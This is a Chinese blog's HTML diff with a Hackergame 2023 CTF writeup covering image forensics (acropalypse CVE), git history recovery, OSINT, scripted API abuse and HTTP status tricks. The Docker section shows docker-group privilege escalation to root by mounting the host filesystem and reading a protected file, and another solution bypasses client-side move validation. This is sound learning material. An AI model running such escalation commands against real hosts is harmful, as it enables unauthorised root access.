@@ -6,21 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://henry-y.github.io">
-  <title>henry_y的小窝</title>
+  <title>hackergame2022 Writeup | henry_y的小窝</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-    
-    <!-- <meta name="keywords" content="">
-    <meta name="description" content=""> -->
-  
-  <meta property="og:type" content="website">
-<meta property="og:title" content="henry_y的小窝">
-<meta property="og:url" content="http://henry-y.github.io/index.html">
+  <meta name="description" content="萌新的第二次hackergame记录！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackergame2022 Writeup">
+<meta property="og:url" content="http://henry-y.github.io/2023/11/04/hackergame2023WriteUp/index.html">
 <meta property="og:site_name" content="henry_y的小窝">
+<meta property="og:description" content="萌新的第二次hackergame记录！">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231104124523214.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231104145109999.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231029150651117.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231029175119767.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231029200857241.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231029205553858.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231030162207099.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231102015719129.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231102015746843.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231102022127763.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231103000714411.png">
+<meta property="og:image" content="http://henry-y.github.io/img/image-20231103000819500.png">
+<meta property="article:published_time" content="2023-11-04T07:15:00.000Z">
+<meta property="article:modified_time" content="2023-11-04T07:16:19.343Z">
 <meta property="article:author" content="henry_y">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://henry-y.github.io/img/image-20231104124523214.png">
   
     <link rel="alternative" href="/atom.xml" title="henry_y的小窝" type="application/atom+xml">
   
@@ -182,19 +196,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-
-  
-    <article id="post-hackergame2023WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-hackergame2023WriteUp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2023/11/04/hackergame2023WriteUp/" target="_blank">hackergame2022 Writeup</a>
-  
+    <h1 class="article-title" itemprop="name">
+      hackergame2022 Writeup
     </h1>
   
 
@@ -208,6 +217,27 @@
   
   
     
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">8.5k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">34分</span>
+    </span>
+  </span>
+</div>
+
 
   
   </header>
@@ -215,13 +245,435 @@
   <div class="article-entry" itemprop="articleBody">
     
     <p>萌新的第二次hackergame记录！</p>
-    
-    <a class="article-more-a" href="/2023/11/04/hackergame2023WriteUp/#more">more >></a>
-    
-    
+<span id="more"></span>
+
+<h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p><img src="/img/image-20231104124523214.png" alt="image-20231104124523214"></p>
+<p>一如既往的好玩，有趣，享受！</p>
+<p>开赛的时候还在cncc会场，回来之后本来想安心补作业的，但终究没忍住玩了一天多把最前面的几道题做了，后面发现作业补不完还quit了一天半把作业都补完了再来继续hackergame启动（标准结局，感觉就是开始做就停不下来了）</p>
+<p>在看到题目有趣的题面时会心一笑，搜索相关内容，收获知识，最终用这些知识获取flag，这一系列过程带来的流畅的正反馈我想便是hackergame让人如此沉迷的原因，同时也一圆我小时候想当黑客的幻想。</p>
+<p>翻了一下去年我写的wp，发现是1050pts，459&#x2F;2747，今年变成了4600pts，58&#x2F;2386，感觉读了一年书还是有长足的进步的。至少混进了前100名中！（上榜了！——）</p>
+<p> 不过今年的数学题是真难啊…</p>
+<p><img src="/img/image-20231104145109999.png" alt="image-20231104145109999"></p>
+<p>因为是写一道题就写一个题的解法，所以这里是按照做出来的顺序排列的，和真实题目难度可能略有差别。</p>
+<h2 id="hackergame启动"><a href="#hackergame启动" class="headerlink" title="hackergame启动"></a>hackergame启动</h2><p><code>flag&#123;We!c0m3-to-H4cKer9AME-AnD-3njOY-HacK1nG-2023&#125;</code></p>
+<p>原神，启动！</p>
+<p>本来下意识F12想把那个实例音频传到手机上然后用电脑录音的，不过后面自己先念了一段玩发现是老套路，用get提交答案，所以把网址后面改成99.99就能交了。</p>
+<h2 id="奶奶的睡前flag故事"><a href="#奶奶的睡前flag故事" class="headerlink" title="奶奶的睡前flag故事"></a>奶奶的睡前flag故事</h2><p><code>flag&#123;sh1nj1ru_k0k0r0_4nata_m4h0&#125;</code></p>
+<p>一眼png隐写，但是一开始没意识到是个加粗的是关键提示。</p>
+<p>搜了一下经典png隐写套路然后pngcheck看了一下说有addtional data，就以为是idat隐写或者是在end后面加东西，找了一些脚本一通操作后失败了。</p>
+<p>吃完饭后回来看意识到加粗可能是关键信息，全部组合起来后查了一下，找到了一个CVE:<code>cve-2023-21036</code></p>
+<p>了解了一下还挺有意思，google程序员怎么会当时没意识到有这么个明显的bug）修改后的截图居然直接放在原位置</p>
+<p>有个在线的网站可以直接利用这个cve：<a target="_blank" rel="noopener" href="https://acropalypse.app/">https://acropalypse.app/</a></p>
+<p>上传图片选Pixel3就可以看到了</p>
+<p><img src="/img/image-20231029150651117.png" alt="image-20231029150651117"></p>
+<h2 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git!"></a>Git? Git!</h2><p><code>flag&#123;TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t&#125;</code></p>
+<p>以前就听说过git的删除是假删除，所以这题应该也是利用了这么一个点。</p>
+<p>直接<code>git reflog</code>显示所有分支然后一个个切回去grep flag就ok了</p>
+<p>应该也可以直接在<code>.git</code>仓库里面找找，不过既然有命令那就用一用简单点。</p>
+<h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答"></a>猫咪问答</h2><p>爬虫题写的有点懵逼，不知道为什么返回200却没有text段给我，所以来写点好玩的休息一下</p>
+<p>🎉🎉🎉<code>flag&#123;w3lc0m3-TO-4t7EnD-TH3-n3K0-eXam-zoz3&#125;</code>🎉🎉🎉</p>
+<p>🎉🎉🎉<code>flag&#123;rEA1-m45TeR-OF-tH3-nEK0-eXaM-in-u$7c&#125;</code>🎉🎉🎉</p>
+<ol>
+<li><p>想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？<strong>（30 分）</strong><br>提示：是一个非负整数。</p>
+<p>答案：<code>12</code></p>
+<p><a target="_blank" rel="noopener" href="http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=2b4855364d76416d512f383633397a3075445a494e773d3d&list=1">A classical introduction to modern number theory &#x3D; (ustc.edu.cn)</a></p>
+<p>随便查查图书馆的官网就行了。</p>
+</li>
+<li><p>今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？<strong>（30 分）</strong><br>提示：是一个非负整数。</p>
+<p>答案：23</p>
+<p>GPT的新browser模式就可以解决这个问题，它帮我找到了论文地址</p>
+<p>[<a target="_blank" rel="noopener" href="https://arxiv.org/abs/2303.17626">2303.17626] Nuggets of Wisdom: Determining an Upper Limit on the Number Density of Chickens in the Universe (arxiv.org)</a></p>
+<p>进去看看摘要就有23这个数字了。<img src="/img/image-20231029175119767.png" alt="image-20231029175119767"></p>
+</li>
+<li><p>为了支持 TCP BBR 拥塞控制算法，在<strong>编译</strong> Linux 内核时应该配置好哪一条内核选项？<strong>（20 分）</strong></p>
+<p>提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。</p>
+<p>答案：<code>CONFIG_TCP_CONG_BBR</code></p>
+<p>还是直接搜英文来的简单，关键词<code>TCP BBR linux kernel “comiple” option &quot;CONFIG&quot;</code></p>
+<p>第一个github仓库里面就有了：<a target="_blank" rel="noopener" href="https://github.com/google/bbr/blob/master/Documentation/bbr-quick-start.md">https://github.com/google/bbr/blob/master/Documentation/bbr-quick-start.md</a></p>
+</li>
+<li><p>🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 <del>MyPY</del> mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？<strong>（20 分）</strong><br>提示：会议的大写英文简称，比如 ISCA、CCS、ICML。</p>
+<p>答案：ECOOP</p>
+<p>”证明 Python 的类型检查和停机问题一样困难。“ 翻译成为英文，然后可以找到论文：<strong>Python Type Hints Are Turing Complete</strong></p>
+<p>直接拿这个名字问带联网的ChatGPT就把信息给我了</p>
+<blockquote>
+<p>该论文《Python Type Hints Are Turing Complete》由 Ori Roth 作者撰写，发表在 2023 年的第 37 届欧洲面向对象编程会议（ECOOP 2023）上。在这篇论文中，作者应用了 Grigore 的算法到 Python 类型提示上，并得出 Python 类型提示是图灵完备的结论<a target="_blank" rel="noopener" href="https://drops.dagstuhl.de/opus/volltexte/2023/18237/">1</a>. 他们展示了 Python 类型系统包括 Grigore 构造中用到的不可判定的 Java 片段，使得它成为图灵完备的，并且与 Java 不同，Python 类型提示由第三方静态分析器和运行时类型检查器检查。新的不可判定性结果意味着这两种类型的检查器都不能完全包含 Python 的类型系统并保证终止<a target="_blank" rel="noopener" href="https://drops.dagstuhl.de/opus/volltexte/2023/18237/">1</a>.</p>
+<p>该论文还提供了一个将图灵机实时模拟的替代减少方案，导致编译时间显著减少，同时伴随着一个将图灵机编译成 Python 子类型机的 Python 实现<a target="_blank" rel="noopener" href="https://www.semanticscholar.org/paper/Python-Type-Hints-are-Turing-Complete-Roth/bc0210361535562dac14987da8a91c7839533682">2</a>. 通过这个研究，作者展示了某些程序会使 MyPy 进入无限循环，这是通过展示一个例子来证明的<a target="_blank" rel="noopener" href="https://ar5iv.labs.arxiv.org/html/2208.14755">3</a>.</p>
+<p>该论文在德国 Dagstuhl 发表，是一篇在编程语言类型系统研究方面作出贡献的重要论文[1](<a target="_blank" rel="noopener" href="https://drops.dagstuhl.de/opus/volltexte/2023/18237/">https://drops.dagstuhl.de/opus/volltexte/2023/18237/</a></p>
+</blockquote>
+<p>有趣的是直接问发表在哪个会议上会说找不到，但是只问论文名字就找得到了，果然还是不要给太多没啥用的prompt。</p>
+<h2 id="旅行照片3-0"><a href="#旅行照片3-0" class="headerlink" title="旅行照片3.0"></a>旅行照片3.0</h2><p>继续来点好玩的，hackergame保留节目咯</p>
+<h3 id="题目-1-2"><a href="#题目-1-2" class="headerlink" title="题目 1-2"></a>题目 1-2</h3><p>1、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd）</p>
+<p><code>2023-08-10</code></p>
+<p>2、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研究所缩写是什么？</p>
+<p><code>ICRR</code></p>
+<p>按经验反正先看exlf就对了（）然后发现去年能直接从exlf看到的信息今年看不到了</p>
+<p>那就从场景入手，首先可以定位到喷泉是在东京上野公园，然后查了一下那个牌牌上的人是诺贝尔奖获得者，搜诺贝尔物理学奖-东京大学获得者，定位到了梶田隆章，看wikipedia就可以知道是東京大学宇宙線研究所長，简称是ICRR。</p>
+<p>见面是真想不到是哪天，上野公园啥活动都摆白色帐篷。所以手动爆破一下日期算了。</p>
+<h3 id="题目-3-4"><a href="#题目-3-4" class="headerlink" title="题目 3-4"></a>题目 3-4</h3><p><code>flag&#123;how_I_wi5h_i_COulD_w1N_A_Nobe1_pri23_73f7e301c7&#125;</code></p>
+<p><code>flag&#123;PluM_w1NE_1S_rEa1LY_EXpen5iVE_bf7b940610&#125;</code></p>
+<p>3、帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？</p>
+<p><code>S495584522</code></p>
+<p>4、学长购买自己的博物馆门票时，花费了多少日元？</p>
+<p><code>0</code></p>
+<p>知道是八月十号就很好定位是什么活动了，美酒节是吧，我也想喝酒T_T，前两天在东北喝的米酒好好喝T_T</p>
+<p>搜索那个美酒节的英文名字加一定出现关键词Volunteer就检索到信息了。</p>
+<p>博物馆门票的话，上野公园那么大肯定在里面的博物馆，所以定位一下，但是把所有的博物馆官网遍历了把所有的成人票学生票票价放进去都不对…很怪</p>
+<p>然后想了想会不会是东大特色优惠</p>
+<p><img src="/img/image-20231029200857241.png" alt="image-20231029200857241"></p>
+<p>结果还真是。。。输入0元flag就出了</p>
+<h3 id="题目-5-6"><a href="#题目-5-6" class="headerlink" title="题目 5-6"></a>题目 5-6</h3><p>5、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？（请用简体中文回答，四个汉字）</p>
+<p><code>安田讲堂</code></p>
+<p>6、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）</p>
+<p><code>熊猫-秋田犬</code></p>
+<p>绝世好社工题，爱来自hackergame</p>
+<p>先做的6再做的5，熊猫是上twitter搜这个活动就找到海报了，是一只粉色大熊猫。</p>
+<p>3D动物的话，马里奥世界应该指的是涩谷任天堂中心，涩谷站的出口就有秋田犬的3d广告牌，然后也是一小时出现一次的。</p>
+<p>第五题真的逆天，把旅游景点旅游路线什么全部遍历了一遍也不行，然后对着那个著名旅游岛也遍历了一遍建筑物，也不行，看的我都想去东京旅游了。</p>
+<p>然后第二天做了几道别的题然后来再看，发现有一个继续学术之旅的定语，秉承着都有用的想法看了一下，发现胸牌上真有会议名称。STATPHYS28.</p>
+<p>查了一下这个会议的日程，他们那天晚上在东大安田讲堂集合。拿下。</p>
+<p>谁家会议怎么还能东京湾夜游啊 —— 我也想去 ——</p>
+</li>
+</ol>
+<h2 id="deeper-and-darker"><a href="#deeper-and-darker" class="headerlink" title="deeper and darker"></a>deeper and darker</h2><p>奇怪的题</p>
+<p>我f12看了一下源码发现它是向服务器搞了个post获取id生成沉船</p>
+<p>（一开始还以为是要我写post请求，然后代码里面那个是他拿来捕获我的内容了，但是用request和selenium写了都返回200但没有text，所以感觉是想错了，这个应该只是向服务器查找我的信息来生成flag）</p>
+<p>再f12搜索了一下flag发现在下面一闪而过，于是截图走人。。</p>
+<p><img src="/img/image-20231029205553858.png" alt="image-20231029205553858"></p>
+<h2 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h2><p><code>flag&#123;I_can_eat_your_pieces_d7e6b3834e&#125;</code></p>
+<p>玩了一下之后就基本能看出要赢只能更改交互规则让你能够在ai下过的地方下棋。</p>
+<p>本来是写了个py爬虫做交互的，但是不知道为什么跟我的预期不相符，理论上应该返回json的，但是给了整个页面的html..也不知道哪里写挂了</p>
+<p>后面换了个比较优雅的做法，把js里面的setmove里面判断能不能下棋的地方的删掉就行，反正合法性只在本地判断没有服务器验证。</p>
+<h2 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h2><p>什么音游模拟器，一定有人可以ap罢！</p>
+<p><code>flag&#123;Web_pr0gra_mm1ng_58c869688c_15fun&#125;</code></p>
+<p>随便点点看f12 - network发现有4个api，checktoken，getmessages，deletemessage还有getflag</p>
+<p>然后需要是连续的所以用request的session功能。</p>
+<p>唯一的坑点是传输的data id需要是json格式的，我用dict格式他给我报token错误。。我对着token错误排查好久没排查出来问题，然后把data换成json格式反而就行了。</p>
+<p>另外一个注意点是他要在3s内撤回消息所以用<code>time.time()</code>测一下时间就好啦~</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://202.38.93.111:10021/&quot;</span></span><br><span class="line"></span><br><span class="line">MessageUrl = url + <span class="string">&quot;api/getMessages&quot;</span></span><br><span class="line">DeleteUrl = url + <span class="string">&quot;api/deleteMessage&quot;</span></span><br><span class="line">FlagUrl = url + <span class="string">&quot;api/getflag&quot;</span></span><br><span class="line">token = <span class="string">&quot;2132:MEUCIQDZh9A8FMRyArPyLTf1gmCBsVeMRlFyQuM8yzHjCMTyNwIgBH0JUa/m68yUl69XNvW4gPIVWfwp7JRWMxK98t6oXBE=&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">TokenUrl = url + <span class="string">&quot;api/checkToken?token=&quot;</span> + token</span><br><span class="line"><span class="comment">#print(TokenUrl)</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">r = session.get(TokenUrl)</span><br><span class="line">r = session.post(MessageUrl)</span><br><span class="line">data = json.loads(r.text)[<span class="string">&quot;messages&quot;</span>]</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line"><span class="built_in">id</span> = <span class="number">0</span></span><br><span class="line">begin = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> data :</span><br><span class="line">    <span class="comment">#print(msg[&quot;text&quot;])</span></span><br><span class="line">    t = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span> : <span class="built_in">id</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;hack\[[a-z]*\]&#x27;</span>, msg[<span class="string">&quot;text&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bool</span>(<span class="keyword">match</span>) == <span class="literal">True</span> :</span><br><span class="line">        <span class="keyword">while</span> time.time() - begin - msg[<span class="string">&quot;delay&quot;</span>] &lt; <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        r = session.post(url=DeleteUrl,headers=headers,data=json.dumps(t))</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">id</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r = session.post(FlagUrl)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(json.loads(r.text))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h2><p><code>flag&#123;SSssTV_y0u_W4NNa_HaV3_4_trY&#125;</code></p>
+<p>应该属于misc里面音频隐写的内容，上ctf wiki上面每个方法都稍微试了一下</p>
+<p>在看sstv的时候在某篇博文里面看到了这么一句话</p>
+<blockquote>
+<p>以前还总有人在搞什么接受空间站的SSTV图片的，近年来越来越少了。</p>
+</blockquote>
+<p>还给了一个示例视频，听起来完全是一个调调。那应该就是sstv慢扫描了，毕竟新手友好题</p>
+<p>下了个Rx-SSTV和虚拟声卡程序跑了一下</p>
+<p><img src="/img/image-20231030162207099.png" alt="image-20231030162207099"></p>
+<h2 id="JSON-in-YAML"><a href="#JSON-in-YAML" class="headerlink" title="JSON $\in$ YAML"></a>JSON $\in$ YAML</h2><p><code>flag&#123;faf9facd7c9d64f74a4a746468400a501965798e72&#125;</code></p>
+<p><code>flag&#123;b1c73f14d04db546b7e7e24cf1cc725287a17a2f3e&#125;</code></p>
+<p>当搜索引擎题做了）</p>
+<ul>
+<li>1.1</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files">https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files</a></p>
+<p>找到一个解释的蛮好的StackOverflow回答。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:123e999&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>1.2</li>
+</ul>
+<blockquote>
+<p>JSON 和 YAML 都旨在成为人类可读的数据交换格式。但是，JSON 和 YAML 具有不同的优先级。JSON 最重要的设计目标是简单性和通用性。因此，JSON 的生成和解析都很简单，但代价是降低了人类可读性。它还使用最低公分母信息模型，确保任何 JSON 数据都可以通过每个现代编程环境轻松处理。</p>
+<p>相比之下，YAML 最重要的设计目标是人类可读性和支持 任意<a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#serialize//">序列化</a>[本机数据结构](<a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#native">https://yaml.org/spec/1.2.1/#native</a> data structure&#x2F;&#x2F;)。因此，YAML 允许生成极其可读的文件，但生成和解析更加复杂。此外，YAML 超越了最低公分母数据类型，在不同编程环境之间跨越时需要更复杂的处理。</p>
+<p>因此，YAML 可以被视为 JSON 的自然超集，提供改进的人类可读性和更完整的信息模型。实践中也是如此；每个 JSON 文件也是一个有效的 YAML 文件。如果&#x2F;当需要附加功能时，这使得从 JSON 迁移到 YAML 变得容易。</p>
+<p>JSON 的<a target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc4627.txt">RFC4627</a> 要求<a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#mapping//">映射</a> <a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#key//">键</a>只是“应该”<a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#equality//">独特</a>，而 YAML 坚持认为它们“必须”是。因此，从技术上讲，YAML 符合 JSON 规范，选择将重复项视为错误。实际上，由于 JSON 对此类重复项的语义保持沉默，因此唯一可移植的 JSON 文件是具有唯一键的文件，因此它们是有效的 YAML 文件。</p>
+<p>定义 YAML 和 JSON 之间的中间格式可能很有用。这种格式解析起来很简单（但人类可读性较差），例如 JSON。同时，它将允许任意<a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#serialize//">序列化</a>[原生数据结构](<a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#native">https://yaml.org/spec/1.2.1/#native</a> data structure&#x2F;&#x2F;)，如 YAML。这种格式也可以作为 YAML 的“规范格式”。定义这样的“ YSON ”格式（YSON 是序列化对象表示法）可以通过增强 JSON 规范或限制 YAML 规范来完成。这样的定义超出了本规范的范围。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://yaml.org/spec/1.2.1/#id2759572">https://yaml.org/spec/1.2.1/#id2759572</a></p>
+<p><a target="_blank" rel="noopener" href="https://lobste.rs/s/equcp2/json_is_not_yaml_subset">https://lobste.rs/s/equcp2/json_is_not_yaml_subset</a></p>
+<p>所以只要构造一个重复键值就行了</p>
+<p>但是我不太能想象这样的json要怎么解读，居然不报错）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;1&quot;,&quot;key&quot;:&quot;2&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="高频率星球"><a href="#高频率星球" class="headerlink" title="高频率星球"></a>高频率星球</h2><p><code>flag&#123;y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371&#125;</code></p>
+<p>使用了一个命令行文本复制工具<code>asciinema</code></p>
+<p><code>asciinema cat asciinema_restore.rec &gt; ans.txt</code>然后稍微用vscode之类的编辑器编辑一下，把前后的删掉还有中间keyboard输入也被录制的那些用空内容替换掉就是个正常的js文件了（ctrl+H然后细心找找有哪些看起来就不对的东西就好），<code>node flag.js</code>运行一下就有结果了。</p>
+<h2 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h2><p>关键词：Docker用户组提权</p>
+<p>事实证明不要随便给人加到用户组里面..挺危险的（</p>
+<p>用户创建一个docker容器后，容器内默认是root账户，于是可以利用原容器再创建一个容器，并将主机映射到新容器中的mnt上，这样就可以在新的docker中作为root为所欲为了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">alpine:/dev/shm$ groups</span><br><span class="line">hg wheel audio video netdev docker</span><br><span class="line">alpine:/dev/shm$ docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">alpine       latest    187eae39ad94   2 months ago   5.54MB</span><br><span class="line">alpine:/dev/shm$ docker run -v /:/mnt --rm -it 187eae39ad94 chroot /mnt sh</span><br><span class="line">/ # ls</span><br><span class="line">bin         flag        media       root        swap        var</span><br><span class="line">boot        home        mnt         run         sys</span><br><span class="line">dev         lib         opt         sbin        tmp</span><br><span class="line">etc         lost+found  proc        srv         usr</span><br><span class="line">/ # cat flag</span><br><span class="line">flag&#123;u5e_r00t1ess_conta1ner_d347d4440f_plz!&#125;</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h2><p><code>flag&#123;d1d you hear the HTTP packet from 1991?&#125;</code></p>
+<p><code>flag&#123;stacking_up_http_status_codes_is_fun_2e34303358&#125;</code></p>
+<p><code>flag&#123;I think that when many such status codes are accumulated dfa9d355c4 it becomes a lifetime&#125;</code></p>
+<p>没学过计网，现学现写（但最后发现结局是现场问GPT能不能构造）</p>
+<ul>
+<li>获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；</li>
+</ul>
+<p>我也不知道怎么回事就过了这part…好怪…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /abcHTTP/1.1 \r\n</span><br></pre></td></tr></table></figure>
+
+<p>我猜可能是因为我忘记打空格了所以不带HTTP版本..（测试了一下GET &#x2F;abc \r\n也可以获得无状态码的响应）</p>
+<ul>
+<li>获取状态码</li>
+</ul>
+<p>200：正常访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>404：找不到资源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>405：客户端请求中的方法被禁止</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUT / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>400：客户端请求的语法错误，服务器无法理解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>414：请求url过长</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?query=LONG_PARAMS HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>
+
